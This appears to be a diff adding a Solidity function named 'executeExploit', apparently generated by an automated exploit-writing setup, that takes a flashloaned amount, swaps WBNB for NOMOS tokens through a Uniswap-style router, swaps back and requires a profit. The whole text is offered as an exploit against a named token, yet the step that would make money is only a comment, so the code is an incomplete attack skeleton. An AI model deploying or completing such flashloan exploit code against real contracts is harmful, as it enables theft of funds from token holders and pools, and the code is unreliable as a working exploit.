@@ -1,0 +1,30 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Use the flashloaned amount to swap it for NOMOS tokens
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // WBNB
+    path[1] = target; // NOMOS
+
+    // Perform the swap
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp + 300);
+
+    // Now obtain the NOMOS tokens, and perform any operations that lead to increasing our WBNB balance.
+    // We'll want to swap NOMOS back for WBNB.
+
+    uint256 tokenBalance = IERC20(target).balanceOf(address(this));
+    require(tokenBalance > 0, "No NOMOS tokens obtained");
+
+    // Check if we can swap NOMOS back to WBNB
+    path[0] = target; // NOMOS
+    path[1] = address(valuableToken); // WBNB
+
+    // Swap NOMOS tokens back to WBNB
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenBalance, 0, path, address(this), block.timestamp + 300);
+
+    // Check final balance of WBNB after the swap
+    uint256 finalWBNBBalance = IERC20(valuableToken).balanceOf(address(this));
+    require(finalWBNBBalance > amount, "Did not make a profit from the exploit");
+}
+</executeExploitCode>
+```
